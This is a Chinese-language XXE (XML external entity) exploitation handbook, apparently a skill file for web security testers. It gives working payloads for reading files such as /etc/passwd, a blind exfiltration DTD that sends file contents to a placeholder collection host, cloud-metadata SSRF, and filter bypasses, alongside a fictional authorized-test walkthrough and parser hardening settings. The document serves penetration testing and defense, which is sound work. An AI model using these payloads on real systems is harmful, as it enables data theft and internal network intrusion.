---
source: test008008008008-glitch/web-security-skills
skill: 04-xxe
fused: 2026-09-17
method: 五步猎洞法
---

---
name: xxe
description: XXE 外部实体注入实战手册。当应用解析 XML（API、SOAP、上传、SAML、SVG）时使用，覆盖文件读取、盲注外带、SSRF 组合利用与解析器配置绕过。
---

# 第四技 · XXE —— 藏在 DOCTYPE 里的搬运工

> 猎手视角：XML 解析器天生听话——你在 DOCTYPE 里"定义一个实体"，它就真的会去打开那个文件、发起那个请求。这份听话，就是 XXE 的全部。

**目标读者**：具备基础 Web 测试经验的安全工程师
**前置要求**：XML 基础语法（DTD、实体）、Burp 改包、了解内部实体与外部实体的区别

---

## 何时启用本技

- 请求体 `Content-Type` 为 `application/xml`、`text/xml` 的接口
- SOAP 服务（WSDL 泄露的旧企业系统重灾区）
- 文件上传：SVG 头像、`.docx/.xlsx/.odt`（本质是 ZIP 包着 XML）、RSS 订阅
- SAML 单点登录断言解析处
- **JSON 接口的伪装测试**：部分框架对 `Content-Type: application/xml` 有兼容回退

---

## 一、原理拆解

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY x SYSTEM "file:///etc/passwd">   <!-- 外部实体：解析器替你去读 -->
]>
<root>&x;</root>                              <!-- 引用处被替换为文件内容 -->
```

三个前提，缺一不可：

1. 输入能控制 XML 文档结构（DOCTYPE 与实体定义）
2. 解析器**处理外部实体**（libxml2 默认禁用；Java `DocumentBuilderFactory`、PHP `libxml<2.9`、.NET `XmlDocument` 老配置常开）
3. 结果有出口：回显（经典型）、报错（报错型）、出网通道（盲型）

XXE 是**一把万能钥匙**：读文件、打 SSRF、内网端口探测、DoS（Billion Laughs）、甚至配合 expect:// 执行命令（PHP 场景）。

---

## 二、五步猎洞法

### 第一步：识面 —— 找 XML 解析面

- 拦截所有请求，筛选 XML 报文与"接受 XML 的兼容接口"
- 上传点收集 `.xml/.svg/.docx` 后缀是否被解析
- `Content-Type` 改成 `application/xml` 发 JSON 报文，看框架是否回退解析

### 第二步：定点 —— DOCTYPE 是否存活

送一个"无害"的 DTD，看响应：

```xml
<!DOCTYPE root [<!ENTITY probe "xxe-alive">]>
<root>&probe;</root>
```

回显 `xxe-alive` = 实体定义被处理，内线已建。若报"DOCTYPE 不允许"，试参数实体变体（见对抗节）。

### 第三步：验证 —— 读一个标志文件

```xml
<!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<root>&x;</root>
```

Windows 目标读 `C:\Windows\win.ini`；能读出即证据落袋。

### 第四步：利用 —— 按出口形态选打法

**回显可用**：直接读敏感文件——配置文件（数据库连接串、AK/SK）、源码、`.bash_history`。注意：文件内容带 `&`、`<>` 会破坏 XML 结构 → 改用 CDATA 拼装：

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % end "]]>">
<!ENTITY % all "%start;%file;%end;">
```

**无回显（Blind XXE）**——外带两段式（外带 DTD 必须放外部，因参数实体内联有转义限制）：

```xml
<!-- 目标请求 -->
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://<你的收集域>/x.dtd">
%remote;]>
```

```xml
<!-- 你的服务器上的 x.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send SYSTEM "http://<你的收集域>/?d=%file;">
%send;
```

**SSRF 组合**：实体指向 `http://169.254.169.254/latest/meta-data/`、内网端口——XXE 的 SSRF 不受应用层 URL 过滤约束（在解析器里发起，不经过应用校验），往往能打到应用层 SSRF 防不住的位置。

**报错型**：让实体指向不存在的 URI，报错信息带出文件路径/内容片段。

### 第五步：收官 —— 留证与定级

读取范围（本地文件 + 可达内网）截图取证；报告附解析器修复配置清单（见防御节）。

---

## 三、实战推演（虚构场景）

> 场景：授权测试虚构企业 OA `oa.demo-example.com`，工单接口 `POST /api/ticket` 接收 XML

1. **识面**：报文 `<ticket><title>..</title></ticket>`，Content-Type `text/xml`
2. **定点**：插入 DOCTYPE 定义 `probe` 实体，响应里 `&probe;` 位置回显 `xxe-alive`
3. **验证**：读 `file:///etc/hostname` 回显 `web-qa-03`，文件读取成立
4. **利用**：读 `/app/config/application.yml` 拿到测试环境数据库密码；再实体指向 `http://10.2.0.15:8080/manager/html`，报错文本泄露内网 Tomcat 存在
5. **收官**：报告定级"XXE → 敏感信息读取 + 内网探测"，附 Java 修复三行配置

---

## 四、对抗与绕过

| 防线 | 破解思路 |
|------|----------|
| 禁 DOCTYPE 但允许参数实体 | `<!ENTITY %` 参数实体在部分配置下被单独放行 |
| 过滤 `SYSTEM`/`file` 关键字 | 大小写、参数实体拆分 `<!ENTITY % s "SYS""TEM">`、编码混淆 |
| XInclude：不能控制根节点 | 上传可控的 XML 片段被 `<xi:include href="file:///flag" parse="text"/>` 引用 |
| SVG 场景过滤 script | 外部实体不依赖 script，藏在 DTD 里 |
| docx/xlsx 场景 | 解开 ZIP 改 `[Content_Types].xml` 或 `word/document.xml`，加 DTD 再打包 |
| Java 高版本禁外部实体 | 检查是否有 XSLT 场景（`document()` 函数）与内网旧服务 SOAP 接口 |

---

## 五、防御视角

1. **禁用外部实体**（各解析器一行配置）：
   - Java：`factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
   - PHP：`libxml_disable_entity_loader`（libxml ≥ 2.9 已默认禁）
   - Python：`defusedxml` 替换标准库
   - .NET：`XmlResolver = null` + `ProhibitDtd`
2. 输入侧：SAX/StAX 校验白名单结构，拒绝含 DOCTYPE 的文档
3. 解析服务**不出网**（网络策略兜底，防盲型外带）
4. 组件版本基线：libxml2 ≥ 2.9，及时升级

---

## 六、踩坑记录

- 回显读文件内容带 `<` 直接把响应打崩 → 换 CDATA 拼装或 PHP filter `php://filter/read=convert.base64-encode/resource=/etc/passwd`
- Blind XXE 外带 DTD 放在 HTTPS 上失败：目标 JDK 信任库不认你的证书——**外带 DTD 用 HTTP**
- 参数实体引用 `%` 在 URL 里必须转义 `%`→`%25`，漏转是盲 XXE 失败率第一原因
- SVG 上传点渲染方式不同：服务端 sharp/rsvg 不执行外部实体，但"预览"功能若走 Java 解析链就中招——**测试要模拟真实渲染路径**
- 千万别在客户生产环境发 Billion Laughs 攻击载荷，那是 DoS，授权测试也兜不住

---

## 七、速查卡

```text
存活:   <!ENTITY probe "alive"> 回显验证
读文件: file:///etc/passwd | php://filter base64 | CDATA拼装
盲型:   外部DTD两段式 %file; → http GET ?d=%file;
SSRF:   实体指向 169.254.169.254 / 内网端口
变体:   XInclude | SVG | docx内改XML | SOAP旧接口
修复:   disallow-doctype-decl / defusedxml / ProhibitDtd
```
